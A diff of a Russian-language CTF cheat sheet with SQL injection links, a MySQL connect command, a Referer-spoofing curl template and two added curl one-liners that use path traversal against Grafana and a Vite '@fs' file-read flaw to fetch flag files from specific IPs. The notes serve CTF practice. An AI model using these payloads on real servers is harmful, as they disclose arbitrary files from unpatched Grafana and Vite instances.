@@ -63,18 +63,17 @@ https://crackstation.net/
 
 SQLi https://proglib.io/p/vzlamyvaem-sayty-shpargalka-po-sql-inekciyam-2019-12-21
 SQLi https://www.knowledgehut.com/blog/security/sql-injection-and-prevention#symptoms-of-sqli%E2%80%8A
-
+SQL connect: mysql -h ip -u root -p port --ssl-verify-server-cert=0
 curl -u **логин**:**пароль** -H "Referer: **откуда**" **куда**
-
 **Логин** это логин.
-
 **Пароль** это пароль с предыдущего задания.
-
 **Откуда** это страница с которой мы вроде как должны переходить
-
 **Куда** это страница с заданием
 
-В ответ в консоль выводится код странички в котором уже ищем пароль к следующему заданию.
+Потенциальные варианты LFI
+ curl -s "http://158.160.112.68:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/flag"
+ curl "http://158.160.63.30:5173/@fs/etc/flag?import&raw??" -o flag.js
+ 
 
 ### OSINT
 https://saucenao.com/ для аниме
@@ -93,3 +92,6 @@ Decompiler
 
 ### Популярный решебник CTF
 https://github.com/cyberpirate92/ctflearn-solutions/tree/master
+
+
+
